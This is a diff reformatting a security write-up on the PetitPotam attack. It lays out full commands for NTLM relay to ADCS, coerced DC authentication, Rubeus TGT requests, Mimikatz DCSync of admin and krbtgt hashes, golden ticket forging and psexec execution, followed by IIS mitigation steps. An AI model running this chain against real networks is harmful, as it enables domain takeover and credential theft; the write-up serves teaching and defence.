@@ -56,12 +56,16 @@ A regular domain user with no special privileges.
 
 # Steps to Create
 ## 1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI
-`ntlmrelayx.py -t http://<CA_Server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
+```bash
+ntlmrelayx.py -t http://<CA_Server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+```
 
 ![ntlm-relay-start](/assets/petitpotam/ntlm-relay-start.jpg)
 
 ## 2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine
-`python3 PetitPotam.py -d <DOMAIN_FQDN> -u <USERNAME> -p <PASSWORD> <KALI> <TARGET_DC>`
+```bash
+python3 PetitPotam.py -d <DOMAIN_FQDN> -u <USERNAME> -p <PASSWORD> <KALI> <TARGET_DC>
+```
 
 ![PetitPotam-Launched](/assets/petitpotam/PetitPotam-Launched.jpg)
 
@@ -71,14 +75,18 @@ A regular domain user with no special privileges.
 
 ## 4. Use Rubeus on the windows machine to request a TGT for that account using the certificate
 
-`.\Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>`
+```bash
+Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>
+```
 
 ![rubeus-command](/assets/petitpotam/rubeus-command.jpg)
 
 ![got-dc2-tgt](/assets/petitpotam/got-dc2-tgt.jpg)
 
 ## 5. *Having the TGT in memory,* use Mimikatz to do a DCSync attack
-`lsadump::dcsync /domain:<DOMAINFQDN> /user:<TARGET_USER>`
+```bash
+lsadump::dcsync /domain:<DOMAINFQDN> /user:<TARGET_USER>
+```
 
 ![dcsync-for-domain-admin-hash](/assets/petitpotam/dcsync-for-domain-admin-hash.jpg)
 
@@ -87,21 +95,36 @@ A regular domain user with no special privileges.
 ![code-execution-as-administrator](/assets/petitpotam/code-execution-as-administrator.jpg)
 
 ## 7. (Optional) Create a Golden Ticket for persistence
-Domain SID Lookup: `lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>`
+Domain SID Lookup: 
+```bash
+lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>
+```
 
 ![domain-sid-lookup](/assets/petitpotam/domain-sid-lookup.jpg)
 
-Obtaining the `krbtgt` account's hash: `lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt`
+Obtaining the `krbtgt` account's hash: 
+```bash
+lsadump::dcsync /domain:<DOMAIN_FQDN> /user:krbtgt
+```
 
 ![krbtgt-hash](/assets/petitpotam/krbtgt-hash.jpg)
 
-Golden ticket creation: `ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <CAN_BE_NON_EXISTING_USERNAME>`
+Golden ticket creation: 
+```bash
+ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <CAN_BE_NON_EXISTING_USERNAME>
+```
 
 ![golden-ticket-created](/assets/petitpotam/golden-ticket-created.jpg)
 
-Exporting ticket to the environment: `export KRB5CCNAME=/<CHOSEN_USERNAME>.ccache`
+Exporting ticket to the environment: 
+```bash
+export KRB5CCNAME=/<CHOSEN_USERNAME>.ccache
+```
 
-Command execution using ticket: `psexec.py <DOMAIN_FQDN>/<CHOSEN_USERNAME>@<DC_FQDN> -k -no-pass`
+Command execution using ticket: 
+```bash
+psexec.py <DOMAIN_FQDN>/<CHOSEN_USERNAME>@<DC_FQDN> -k -no-pass
+```
 
 ![golden-ticket-used](/assets/petitpotam/golden-ticket-used.jpg)
 
@@ -128,7 +151,10 @@ IIS Manager -> Sites -> Default Web Site -> CertSrv -> SSL Settings -> Require S
 ![cert-srv-require-ssl](/assets/petitpotam/cert-srv-require-ssl.jpg)
 
 ## 4. Restart IIS
-*From an elevated command prompt,* type: `iisreset /restart`
+*From an elevated command prompt,* type: 
+```bash
+iisreset /restart
+````
 
 ---
 
